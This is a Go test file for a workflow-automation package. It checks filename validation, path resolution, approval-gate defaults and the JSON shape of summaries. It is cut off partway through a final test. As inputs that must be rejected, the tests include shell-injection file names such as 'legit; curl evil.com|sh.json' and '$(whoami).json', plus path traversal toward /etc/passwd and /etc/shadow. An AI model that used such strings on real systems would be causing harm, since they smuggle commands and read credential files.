package automate

import (
	"encoding/json"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// IsValidFilename
// ---------------------------------------------------------------------------

func TestIsValidFilename(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		// — valid —
		{"workflow.json", "workflow.json", true},
		{"my-workflow.json", "my-workflow.json", true},
		{"my_workflow.json", "my_workflow.json", true},
		{"workflow.v2.json", "workflow.v2.json", true},
		{"a.json", "a.json", true},
		{"MY_WORKFLOW.JSON", "MY_WORKFLOW.JSON", false}, // regex requires lowercase .json
		{"complex-name_v2.3.json", "complex-name_v2.3.json", true},

		// — invalid: shell injection —
		{"shell injection pipe", "legit; curl evil.com|sh.json", false},
		{"shell injection cmd subst", "$(cmd).json", false},
		{"shell injection backtick", "`cmd`.json", false},
		{"shell injection pipe char", "|cmd.json", false},
		{"shell injection andand", "&&cmd.json", false},
		{"shell injection oror", "||cmd.json", false},
		{"shell injection dollar", "$cmd.json", false},
		{"shell injection paren", "(cmd).json", false},

		// — invalid: path traversal —
		{"path traversal dotdot", "../../etc/passwd.json", false},
		{"path traversal leading dot", "../etc/passwd.json", false},

		// — invalid: wrong extension —
		{"txt extension", "workflow.txt", false},
		{"no extension", "workflow", false},
		{"space in name", "workflow txt", false},
		{"json in middle not suffix", "workflow.json.bak", false},

		// — invalid: edge cases —
		{"empty string", "", false},
		{"just extension", ".json", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IsValidFilename(tt.input)
			if got != tt.expected {
				t.Errorf("IsValidFilename(%q) = %v, want %v", tt.input, got, tt.expected)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Dir
// ---------------------------------------------------------------------------

func TestDir(t *testing.T) {
	dir := Dir()
	if !strings.HasSuffix(dir, "/automate") && !strings.HasSuffix(dir, "\\automate") {
		t.Errorf("Dir() = %q, expected path ending in /automate", dir)
	}
}

// ---------------------------------------------------------------------------
// IsNotExists
// ---------------------------------------------------------------------------

func TestIsNotExists(t *testing.T) {
	t.Run("fs.ErrNotExist returns true", func(t *testing.T) {
		if !IsNotExists(fs.ErrNotExist) {
			t.Error("IsNotExists(fs.ErrNotExist) should be true")
		}
	})

	t.Run("wrapped fs.ErrNotExist returns true", func(t *testing.T) {
		wrapped := errors.Join(fs.ErrNotExist, errors.New("extra context"))
		if !IsNotExists(wrapped) {
			t.Error("IsNotExists(wrapped fs.ErrNotExist) should be true")
		}
	})

	t.Run("other error returns false", func(t *testing.T) {
		if IsNotExists(errors.New("some other error")) {
			t.Error("IsNotExists(other error) should be false")
		}
	})

	t.Run("nil returns false", func(t *testing.T) {
		if IsNotExists(nil) {
			t.Error("IsNotExists(nil) should be false")
		}
	})
}

// ---------------------------------------------------------------------------
// ExtractDescription
// ---------------------------------------------------------------------------

func TestExtractDescription(t *testing.T) {
	t.Run("valid workflow with description", func(t *testing.T) {
		dir := t.TempDir()
		path := filepath.Join(dir, "test.json")
		mustWriteFile(t, path, `{
			"description": "My workflow",
			"initial": {"message": "hello"}
		}`)

		desc, err := ExtractDescription(path)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if desc != "My workflow" {
			t.Errorf("ExtractDescription() = %q, want %q", desc, "My workflow")
		}
	})

	t.Run("valid workflow without description", func(t *testing.T) {
		dir := t.TempDir()
		path := filepath.Join(dir, "test.json")
		mustWriteFile(t, path, `{
			"initial": {"message": "hello"}
		}`)

		desc, err := ExtractDescription(path)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if desc != "" {
			t.Errorf("ExtractDescription() = %q, want empty string", desc)
		}
	})

	t.Run("valid workflow with steps instead of initial", func(t *testing.T) {
		dir := t.TempDir()
		path := filepath.Join(dir, "test.json")
		mustWriteFile(t, path, `{
			"description": "Steps-based workflow",
			"steps": [{"message": "step 1"}]
		}`)

		desc, err := ExtractDescription(path)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if desc != "Steps-based workflow" {
			t.Errorf("ExtractDescription() = %q, want %q", desc, "Steps-based workflow")
		}
	})

	t.Run("JSON without initial or steps", func(t *testing.T) {
		dir := t.TempDir()
		path := filepath.Join(dir, "test.json")
		mustWriteFile(t, path, `{"not_a_workflow": true}`)

		_, err := ExtractDescription(path)
		if err == nil {
			t.Fatal("expected error for non-workflow JSON")
		}
		if !strings.Contains(err.Error(), "not a workflow config") {
			t.Errorf("expected 'not a workflow config' error, got: %v", err)
		}
	})

	t.Run("non-JSON file", func(t *testing.T) {
		dir := t.TempDir()
		path := filepath.Join(dir, "test.json")
		mustWriteFile(t, path, `this is not json`)

		_, err := ExtractDescription(path)
		if err == nil {
			t.Fatal("expected error for non-JSON content")
		}
	})

	t.Run("non-existent file", func(t *testing.T) {
		_, err := ExtractDescription("/nonexistent/path/file.json")
		if err == nil {
			t.Fatal("expected error for non-existent file")
		}
	})
}

// ---------------------------------------------------------------------------
// Discover
// ---------------------------------------------------------------------------

func TestDiscover(t *testing.T) {
	t.Run("happy path with multiple valid workflows", func(t *testing.T) {
		dir := t.TempDir()

		mustWriteFile(t, filepath.Join(dir, "workflow1.json"), `{
			"description": "First workflow",
			"initial": {"message": "hello"}
		}`)
		mustWriteFile(t, filepath.Join(dir, "workflow2.json"), `{
			"description": "Second workflow",
			"steps": [{"message": "step"}]
		}`)
		mustWriteFile(t, filepath.Join(dir, "no_desc.json"), `{
			"initial": {"message": "no desc"}
		}`)

		entries, err := Discover(dir)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if len(entries) != 3 {
			t.Fatalf("expected 3 entries, got %d", len(entries))
		}

		// Check first workflow
		if entries[0].Filename != "no_desc.json" && entries[0].Filename != "workflow1.json" && entries[0].Filename != "workflow2.json" {
			t.Errorf("unexpected filename: %s", entries[0].Filename)
		}

		// Verify all have correct paths
		for _, e := range entries {
			if !strings.HasPrefix(e.FilePath, dir) {
				t.Errorf("FilePath %s should start with %s", e.FilePath, dir)
			}
		}
	})

	t.Run("empty directory returns empty slice", func(t *testing.T) {
		dir := t.TempDir()

		entries, err := Discover(dir)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if len(entries) != 0 {
			t.Errorf("expected 0 entries for empty dir, got %d", len(entries))
		}
	})

	t.Run("non-existent directory returns error", func(t *testing.T) {
		_, err := Discover("/nonexistent/path/that/does/not/exist")
		if err == nil {
			t.Fatal("expected error for non-existent directory")
		}
	})

	t.Run("skips non-JSON files", func(t *testing.T) {
		dir := t.TempDir()

		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"description": "Valid",
			"initial": {"message": "hello"}
		}`)
		mustWriteFile(t, filepath.Join(dir, "readme.txt"), "This is a readme")
		mustWriteFile(t, filepath.Join(dir, "Makefile"), "all:\n\techo hello")

		entries, err := Discover(dir)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if len(entries) != 1 {
			t.Fatalf("expected 1 entry (only .json), got %d", len(entries))
		}
		if entries[0].Filename != "workflow.json" {
			t.Errorf("expected workflow.json, got %s", entries[0].Filename)
		}
	})

	t.Run("skips files with invalid names", func(t *testing.T) {
		dir := t.TempDir()

		mustWriteFile(t, filepath.Join(dir, "good.json"), `{
			"description": "Good workflow",
			"initial": {"message": "hello"}
		}`)
		// Use filenames that are creatable on all OSes but fail the safety regex
		mustWriteFile(t, filepath.Join(dir, "$(whoami).json"), `{
			"description": "Injection",
			"initial": {"message": "injection"}
		}`)
		mustWriteFile(t, filepath.Join(dir, "test & test.json"), `{
			"description": "Ampersand",
			"initial": {"message": "amp"}
		}`)

		entries, err := Discover(dir)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if len(entries) != 1 {
			t.Fatalf("expected 1 entry (safe names only), got %d", len(entries))
		}
		if entries[0].Filename != "good.json" {
			t.Errorf("expected good.json, got %s", entries[0].Filename)
		}
	})

	t.Run("skips invalid workflow JSON (missing initial and steps)", func(t *testing.T) {
		dir := t.TempDir()

		mustWriteFile(t, filepath.Join(dir, "valid.json"), `{
			"description": "Valid",
			"initial": {"message": "hello"}
		}`)
		mustWriteFile(t, filepath.Join(dir, "not_workflow.json"), `{
			"data": "not a workflow"
		}`)
		mustWriteFile(t, filepath.Join(dir, "corrupt.json"), `not valid json`)

		entries, err := Discover(dir)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if len(entries) != 1 {
			t.Fatalf("expected 1 entry, got %d", len(entries))
		}
		if entries[0].Filename != "valid.json" {
			t.Errorf("expected valid.json, got %s", entries[0].Filename)
		}
	})

	t.Run("skips subdirectories", func(t *testing.T) {
		dir := t.TempDir()

		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"description": "Valid",
			"initial": {"message": "hello"}
		}`)
		os.MkdirAll(filepath.Join(dir, "subdir"), 0755)
		mustWriteFile(t, filepath.Join(dir, "subdir", "nested.json"), `{
			"description": "Nested",
			"initial": {"message": "nested"}
		}`)

		entries, err := Discover(dir)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if len(entries) != 1 {
			t.Fatalf("expected 1 entry (no subdirs), got %d", len(entries))
		}
	})
}

// ---------------------------------------------------------------------------
// ResolvePath
// ---------------------------------------------------------------------------

func TestResolvePath(t *testing.T) {
	t.Run("exact match with .json extension", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		path, err := ResolvePath(dir, "workflow.json")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if path != filepath.Join(dir, "workflow.json") {
			t.Errorf("ResolvePath() = %q, want %q", path, filepath.Join(dir, "workflow.json"))
		}
	})

	t.Run("name without .json extension appends .json", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		path, err := ResolvePath(dir, "workflow")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if path != filepath.Join(dir, "workflow.json") {
			t.Errorf("ResolvePath() = %q, want %q", path, filepath.Join(dir, "workflow.json"))
		}
	})

	t.Run("case-insensitive .json extension", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		path, err := ResolvePath(dir, "workflow.JSON")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		// On case-insensitive filesystems (macOS), os.Stat("workflow.JSON") resolves
		// to the actual file "workflow.json". On case-sensitive filesystems, the
		// .JSON suffix means it won't be treated as having .json and won't match.
		// Either way, the path should be under the test directory.
		if !strings.HasPrefix(path, dir) {
			t.Errorf("ResolvePath() = %q, expected path under %q", path, dir)
		}
	})

	t.Run("substring match returns single match", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "full_autonomous_workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		path, err := ResolvePath(dir, "autonomous")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if path != filepath.Join(dir, "full_autonomous_workflow.json") {
			t.Errorf("ResolvePath() = %q, want %q", path, filepath.Join(dir, "full_autonomous_workflow.json"))
		}
	})

	t.Run("multiple substring matches returns error", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "autonomous_deploy.json"), `{
			"initial": {"message": "deploy"}
		}`)
		mustWriteFile(t, filepath.Join(dir, "autonomous_test.json"), `{
			"initial": {"message": "test"}
		}`)

		_, err := ResolvePath(dir, "autonomous")
		if err == nil {
			t.Fatal("expected error for multiple matches")
		}
		if !strings.Contains(err.Error(), "multiple workflows match") {
			t.Errorf("expected 'multiple workflows match' error, got: %v", err)
		}
	})

	t.Run("no matches returns error", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		_, err := ResolvePath(dir, "nonexistent")
		if err == nil {
			t.Fatal("expected error for no matches")
		}
		if !strings.Contains(err.Error(), "no workflow matching") {
			t.Errorf("expected 'no workflow matching' error, got: %v", err)
		}
	})

	t.Run("path traversal with dotdot is blocked", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		_, err := ResolvePath(dir, "../../etc/passwd")
		if err == nil {
			t.Fatal("expected path traversal error")
		}
		if !strings.Contains(err.Error(), "workflow path escapes") {
			t.Errorf("expected 'workflow path escapes' error, got: %v", err)
		}
	})

	t.Run("path traversal with .json suffix is blocked", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		_, err := ResolvePath(dir, "../../etc/shadow.json")
		if err == nil {
			t.Fatal("expected path traversal error")
		}
		if !strings.Contains(err.Error(), "workflow path escapes") {
			t.Errorf("expected 'workflow path escapes' error, got: %v", err)
		}
	})

	t.Run("exact match rejects planted file with shell metacharacters", func(t *testing.T) {
		// Defense-in-depth: even when the path stays under dir (no traversal)
		// and the file actually exists, ResolvePath must refuse to return
		// filenames that contain characters which would inject shell commands
		// once the path is embedded in a shell-interpreted command line
		// (e.g. BackgroundProcessManager.Start runs sh -c <cmdStr>).
		dir := t.TempDir()
		planted := filepath.Join(dir, "legit;echo PWNED.json")
		mustWriteFile(t, planted, `{"initial": {"message": "hi"}}`)

		_, err := ResolvePath(dir, "legit;echo PWNED")
		if err == nil {
			t.Fatal("expected unsafe-filename rejection, got nil")
		}
		if !strings.Contains(err.Error(), "unsafe workflow filename") {
			t.Errorf("expected 'unsafe workflow filename' error, got: %v", err)
		}
	})

	t.Run("exact match takes precedence over substring", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "test.json"), `{
			"initial": {"message": "exact"}
		}`)
		mustWriteFile(t, filepath.Join(dir, "my_test_workflow.json"), `{
			"initial": {"message": "substring"}
		}`)

		path, err := ResolvePath(dir, "test")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		// "test" without .json → tries "test.json" first → exact match wins
		if path != filepath.Join(dir, "test.json") {
			t.Errorf("ResolvePath() = %q, want %q", path, filepath.Join(dir, "test.json"))
		}
	})

	t.Run("non-existent directory returns error", func(t *testing.T) {
		_, err := ResolvePath("/nonexistent/path/that/does/not/exist", "workflow")
		if err == nil {
			t.Fatal("expected error for non-existent directory")
		}
	})

	t.Run("substring match is case-insensitive", func(t *testing.T) {
		dir := t.TempDir()
		mustWriteFile(t, filepath.Join(dir, "My_Workflow.json"), `{
			"initial": {"message": "hello"}
		}`)

		path, err := ResolvePath(dir, "my_workflow")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		// On case-insensitive filesystems (macOS), "my_workflow.json" resolves to
		// "My_Workflow.json" via os.Stat at the exact-match stage, so it's found
		// before the substring search. On case-sensitive filesystems, the substring
		// match catches it. Either way, it should resolve successfully under dir.
		if !strings.HasPrefix(path, dir) {
			t.Errorf("ResolvePath() = %q, expected path under %q", path, dir)
		}
	})
}

// ---------------------------------------------------------------------------
// Summarize / IsApprovalRequired
// ---------------------------------------------------------------------------

func TestSummarize_RequiresApprovalDefault(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "default.json")
	mustWriteFile(t, path, `{"initial":{"prompt":"hi"}}`)

	s, err := Summarize(path)
	if err != nil {
		t.Fatalf("Summarize: %v", err)
	}
	if !s.IsApprovalRequired() {
		t.Fatalf("IsApprovalRequired() should default to true when field is absent")
	}
	if s.RequiresApproval != nil {
		t.Fatalf("RequiresApproval field should remain nil when absent in JSON")
	}
}

func TestSummarize_RequiresApprovalExplicitFalse(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "explicit-false.json")
	mustWriteFile(t, path, `{"requires_approval": false, "initial":{"prompt":"hi"}}`)

	s, err := Summarize(path)
	if err != nil {
		t.Fatalf("Summarize: %v", err)
	}
	if s.IsApprovalRequired() {
		t.Fatalf("IsApprovalRequired() should be false when explicitly disabled")
	}
}

func TestSummarize_RequiresApprovalExplicitTrue(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "explicit-true.json")
	mustWriteFile(t, path, `{"requires_approval": true, "initial":{"prompt":"hi"}}`)

	s, err := Summarize(path)
	if err != nil {
		t.Fatalf("Summarize: %v", err)
	}
	if !s.IsApprovalRequired() {
		t.Fatalf("IsApprovalRequired() should be true when explicitly enabled")
	}
}

func TestSummary_IsApprovalRequired_NilSafe(t *testing.T) {
	var s *Summary
	if !s.IsApprovalRequired() {
		t.Fatalf("nil Summary should default to require approval")
	}
}

// ---------------------------------------------------------------------------
// SP-128 Phase 2b: Summary JSON shape
//
// The WebUI `/api/automate/run` approval gate embeds the full Summary
// under the `summary` key so the frontend can render the same overview
// as the CLI. These tests pin the JSON contract: snake_case tags,
// omitempty on optional fields, requires_approval + subagent_timeout_seconds
// always present (no omitempty on the pointer fields so the frontend can
// distinguish unset from absent), allowed_paths serializes the full
// entry including reason when present.
// ---------------------------------------------------------------------------

func TestSummary_JSON_RequiresApprovalAlwaysPresent(t *testing.T) {
	// Both states — unset (nil) and explicit false — must serialize the
	// field so the WebUI can render the gate consistently. The spec calls
	// this out: "no `omitempty` mishaps that hide `requires_approval`".
	trues := []bool{true, false}
	for _, val := range trues {
		val := val
		t.Run(fmt.Sprintf("explicit_%v", val), func(t *testing.T) {
			s := &Summary{RequiresApproval: &val}
			data, err := json.Marshal(s)
			if err != nil {
				t.Fatalf("Marshal: %v", err)
			}
			var decoded map[string]interface{}
			if err := json.Unmarshal(data, &decoded); err != nil {
				t.Fatalf("Unmarshal: %v", err)
			}
			got, ok := decoded["requires_approval"].(bool)
			if !ok {
				t.Fatalf("requires_approval missing or not a bool in %s", data)
			}
			if got != val {
				t.Errorf("requires_approval: got %v, want %v", got, val)
			}
		})
	}

	t.Run("nil serializes as null not absent", func(t *testing.T) {
		s := &Summary{}
		data, err := json.Marshal(s)
		if err != nil {
			t.Fatalf("Marshal: %v", err)
		}
		// Field must appear in the JSON output, even as null. The frontend
		// uses `summary.requires_approval ?? true` to default.
		if !strings.Contains(string(data), `"requires_approval":null`) {
			t.Errorf("expected `requires_approval: null` in output, got: %s", data)
		}
	})
}

func TestSummary_JSON_SubagentTimeoutAlwaysPresent(t *testing.T) {
	// Same nil-safe contract as RequiresApproval.
	t.Run("nil serializes as null", func(t *testing.T) {
		s := &Summary{}
		data, err := json.Marshal(s)
		if err != nil {
			t.Fatalf("Marshal: %v", err)
		}
		if !strings.Contains(string(data), `"subagent_timeout_seconds":null`) {
			t.Errorf("expected `subagent_timeout_seconds: null` in output, got: %s", data)
		}
	})

	t.Run("explicit value serializes correctly", func(t *testing.T) {
		secs := 2700
		s := &Summary{SubagentTimeoutSeconds: &secs}
		data, err := json.Marshal(s)
		if err != nil {
			t.Fatalf("Marshal: %v", err)
		}
		var decoded map[string]interface{}
		if err := json.Unmarshal(data, &decoded); err != nil {
			t.Fatalf("Unmarshal: %v", err)
		}
		got, ok := decoded["subagent_timeout_seconds"].(float64)
		if !ok {
			t.Fatalf("subagent_timeout_seconds missing or not a number in %s", data)
		}
		if got != 2700 {
			t.Errorf("subagent_timeout_seconds: got %v, want 2700", got)
		}
	})
}

func TestSummary_JSON_OptionalFieldsOmitWhenEmpty(t *testing.T) {
	// A bare Summary with zero values must NOT carry description, steps,
	// initial, budget, allowed_paths, or warnings keys — those are
	// omitempty so workflows that don't set them produce clean JSON.
	s := &Summary{}
	data, err := json.Marshal(s)
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}
	for _, key := range []string{
		"description", "initial", "steps", "budget",
		"allowed_paths", "warnings", "continue_on_error", "no_web_ui",
	} {
		if strings.Contains(string(data), `"`+key+`":`) {
			t.Errorf("optional field %q should be omitted when empty; got: %s", key, data)
		}
	}
}

func TestSummary_JSON_AllowedPathsAndWarningsSerialize(t *testing.T) {
	// Phase 1 already populates AllowedPaths + Warnings; Phase 2 must
	// serialize them on the wire so the WebUI dialog can render them.
	s := &Summary{
		Description: "Run nightly tests",
		AllowedPaths: []AllowedPathSummary{
			{Path: "/srv/datasets", Mode: "read_write", Reason: "Read training data"},
			{Path: "/var/log/sprout", Mode: "read_only"},
		},
		Warnings: []string{"allowed_paths[0] \"/srv/datasets\" falls under a system prefix"},
	}
	data, err := json.Marshal(s)
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}

	var decoded struct {
		Description  string `json:"description"`
		AllowedPaths []struct {
			Path   string `json:"path"`
			Mode   string `json:"mode"`
			Reason string `json:"reason"`
		} `json:"allowed_paths"`
		Warnings []string `json:"warnings"`
	}
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Unmarshal: %v", err)
	}
	if decoded.Description != "Run nightly tests" {
		t.Errorf("description: got %q", decoded.Description)
	}
	if len(decoded.AllowedPaths) != 2 {
		t.Fatalf("allowed_paths: got %d, want 2", len(decoded.AllowedPaths))
	}
	if decoded.AllowedPaths[0].Path != "/srv/datasets" ||
		decoded.AllowedPaths[0].Mode != "read_write" ||
		decoded.AllowedPaths[0].Reason != "Read training data" {
		t.Errorf("allowed_paths[0] wrong: %+v", decoded.AllowedPaths[0])
	}
	if decoded.AllowedPaths[1].Reason != "" {
		t.Errorf("allowed_paths[1] reason should be omitted when empty: %+v", decoded.AllowedPaths[1])
	}
	if len(decoded.Warnings) != 1 {
		t.Fatalf("warnings: got %d, want 1", len(decoded.Warnings))
	}
}

func TestSummary_JSON_StepAndInitialShape(t *testing.T) {
	// Steps and Initial nest other types — confirm their JSON tags too.
	s := &Summary{
		Initial: &InitialSummary{
			Persona:       "main",
			Provider:      "anthropic",
			Model:         "claude-opus-4",
			MaxIterations: 5,
			HasPrompt:     true,
		},
		Steps: []StepSummary{
			{Name: "build", Kind: "shell", CommandPreview: "$ go build"},
			{Name: "test", Kind: "agent", Persona: "reviewer"},
		},
		Budget: &BudgetSummary{USD: 10.0, WarnAt: []float64{0.5, 0.8}},
	}
	data, err := json.Marshal(s)
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}
	for _, want := range []string{
		`"persona":"main"`,
		`"provider":"anthropic"`,
		`"model":"claude-opus-4"`,
		`"max_iterations":5`,
		`"has_prompt":true`,
		`"name":"build"`,
		`"kind":"shell"`,
		`"command_preview":"$ go build"`,
		`"warn_at":[0.5,0.8]`,
	} {
		if !strings.Contains(string(data), want) {
			t.Errorf("expected %q in JSON output, got: %s", want, data)
		}
	}
}

func TestSummarize_RoundTripsThroughJSONShape(t *testing.T) {
	// End-to-end: write a workflow file, run Summarize, marshal to JSON,
	// and confirm the WebUI-relevant fields survive the round-trip with
	// snake_case keys the frontend expects.
	dir := t.TempDir()
	path := filepath.Join(dir, "rt.json")
	mustWriteFile(t, path, `{
		"description": "Round-trip test",
		"requires_approval": false,
		"subagent_timeout_seconds": 1200,
		"allowed_paths": [
			{"path": "/srv/datasets", "mode": "read_write", "reason": "Test data"}
		],
		"initial": {"persona": "main", "provider": "anthropic", "model": "claude-opus-4", "max_iterations": 3}
	}`)

	s, err := Summarize(path)
	if err != nil {
		t.Fatalf("Summarize: %v", err)
	}
	data, err := json.Marshal(s)
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}

	var decoded map[string]interface{}
	if err := json.Unmarshal(data, &decoded); err != nil {
		t.Fatalf("Unmarshal: %v", err)
	}
	if decoded["description"] != "Round-trip test" {
		t.Errorf("description: got %v", decoded["description"])
	}
	if decoded["requires_approval"] != false {
		t.Errorf("requires_approval: got %v (want false)", decoded["requires_approval"])
	}
	if decoded["subagent_timeout_seconds"].(float64) != 1200 {
		t.Errorf("subagent_timeout_seconds: got %v (want 1200)", decoded["subagent_timeout_seconds"])
	}
	ap, ok := decoded["allowed_paths"].([]interface{})
	if !ok || len(ap) != 1 {
		t.Fatalf("allowed_paths: got %v (want 1 entry)", decoded["allowed_paths"])
	}
	first := ap[0].(map[string]interface{})
	if first["path"] != "/srv/datasets" || first["mode"] != "read_write" || first["reason"] != "Test data" {
		t.Errorf("allowed_paths[0]: got %+v", first)
	}
}

// ---------------------------------------------------------------------------
// DirIn (SP-119)
// ---------------------------------------------------------------------------

func TestDirIn(t *testing.T) {
	t.Run("empty workspace falls back to cwd-based Dir", func(t *testing.T) {
		got := DirIn("")
		want := Dir()
		if got != want {
			t.Errorf("DirIn(%q) = %q, want Dir() = %q", "", got, want)
		}
	})

	t.Run("whitespace-only workspace falls back to cwd-based Dir", func(t *testing.T) {
		got := DirIn("   ")
		want := Dir()
		if got != want {
			t.Errorf("DirIn(%q) = %q, want Dir() = %q", "   ", got, want)
		}
	})

	t.Run("explicit workspace joins automate dir", func(t *testing.T) {
		got := DirIn("/tmp/foo")
		want := filepath.Join("/tmp/foo", "automate")
		if got != want {
			t.Errorf("DirIn(%q) = %q, want %q", "/tmp/foo", got, want)
		}
	})

	t.Run("relative path joins automate dir", func(t *testing.T) {
		got := DirIn("subdir")
		want := filepath.Join("subdir", "automate")
		if got != want {
			t.Errorf("DirIn(%q) = %q, want %q", "subdir", got, want)
		}
	})
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

func mustWriteFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatalf("failed to write %s: %v", path, err)
	}
}

// ---------------------------------------------------------------------------
// SP-127 Phase 2: Step-level and initial-level allowed_paths in Summarize
// ---------------------------------------------------------------------------

// TestSummarize_StepAllowedPaths_SurfacesPaths verifies that Summarize
// correctly surfaces step-level allowed_paths in the StepSummary output.
func TestSummarize_StepAllowedPaths_SurfacesPaths(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "wf.json")
	mustWriteFile(t, path, `{
		"description": "Test workflow with step-level allowed_paths",
		"initial": {"prompt": "do the thing"},
		"steps": [
			{
				"name": "process",
				"prompt": "process data",
				"allowed_paths": [
					{"path": "/srv/datasets", "mode": "read_only", "reason": "Training data"},
					{"path": "/tmp/output", "mode": "read_write"}
				]
			}
		]
	}`)

	s, err := Summarize(path)
	if err != nil {
		t.Fatalf("Summarize: %v", err)
	}
	if len(s.Steps) != 1 {
		t.Fatalf("expected 1 step, got %d", len(s.Steps))
	}
	step := s.Steps[0]
	if step.Name != "process" {
		t.Errorf("step name: got %q, want %q", step.Name, "process")
	}
	if len(step.AllowedPaths) != 2 {
		t.Fatalf("expected 2 allowed_paths on step, got %d", len(step.AllowedPaths))
	}
	// Entries should be sorted by path.
	if step.AllowedPaths[0].Path != "/srv/datasets" {
		t.Errorf("step allowed_paths[0]: got %q, want /srv/datasets", step.AllowedPaths[0].Path)
	}
	if step.AllowedPaths[0].Mode != "read_only" {
		t.Errorf("step allowed_paths[0].Mode: got %q, want read_only", step.AllowedPaths[0].Mode)
	}
	if step.AllowedPaths[0].Reason != "Training data" {
		t.Errorf("step allowed_paths[0].Reason: got %q, want 'Training data'", step.AllowedPaths[0].Reason)
	}
	if step.AllowedPaths[1].Path != "/tmp/output" {
		t.Errorf("step allowed_paths[1]: got %q, want /tmp/output", step.AllowedPaths[1].Path)
	}
}

// TestSummarize_InitialAllowedPaths_SurfacesPaths verifies that Summarize
// correctly surfaces initial-level allowed_paths in the InitialSummary output.
func TestSummarize_InitialAllowedPaths_SurfacesPaths(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "wf.json")
	mustWriteFile(t, path, `{
		"description": "Test workflow with initial-level allowed_paths",
		"initial": {
			"prompt": "do the thing",
			"allowed_paths": [
				{"path": "/tmp/work", "mode": "read_write", "reason": "Temp workspace"}
			]
		}
	}`)

	s, err := Summarize(path)
	if err != nil {
		t.Fatalf("Summarize: %v", err)
	}
	if s.Initial == nil {
		t.Fatal("expected Initial to be non-nil")
	}
	if len(s.Initial.AllowedPaths) != 1 {
		t.Fatalf("expected 1 allowed_path on initial, got %d", len(s.Initial.AllowedPaths))
	}
	if s.Initial.AllowedPaths[0].Path != "/tmp/work" {
		t.Errorf("initial allowed_paths[0].Path: got %q, want /tmp/work", s.Initial.AllowedPaths[0].Path)
	}
	if s.Initial.AllowedPaths[0].Mode != "read_write" {
		t.Errorf("initial allowed_paths[0].Mode: got %q, want read_write", s.Initial.AllowedPaths[0].Mode)
	}
	if s.Initial.AllowedPaths[0].Reason != "Temp workspace" {
		t.Errorf("initial allowed_paths[0].Reason: got %q, want 'Temp workspace'", s.Initial.AllowedPaths[0].Reason)
	}
}

// TestSummarize_StepAllowedPaths_MalformedEntryError verifies that a malformed
// step-level allowed_path entry returns a parse error (mirrors workflow-level behavior).
func TestSummarize_StepAllowedPaths_MalformedEntryError(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "wf.json")
	mustWriteFile(t, path, `{
		"initial": {"prompt": "do the thing"},
		"steps": [
			{
				"prompt": "process data",
				"allowed_paths": [
					{"path": "relative/path", "mode": "read_write"}
				]
			}
		]
	}`)

	_, err := Summarize(path)
	if err == nil {
		t.Fatal("expected parse error for malformed step-level allowed_path; got nil")
	}
	// Error should identify the scope and index.
	if !strings.Contains(err.Error(), "step") {
		t.Fatalf("error should mention 'step' scope, got: %v", err)
	}
	if !strings.Contains(err.Error(), "allowed_paths[0]") {
		t.Fatalf("error should identify allowed_paths[0] index, got: %v", err)
	}
	if !strings.Contains(err.Error(), "absolute") {
		t.Fatalf("error should mention 'absolute', got: %v", err)
	}
}

// TestSummarize_InitialAllowedPaths_MalformedEntryError verifies that a malformed
// initial-level allowed_path entry returns a parse error.
func TestSummarize_InitialAllowedPaths_MalformedEntryError(t *testing.T) {
	dir := t.TempDir()
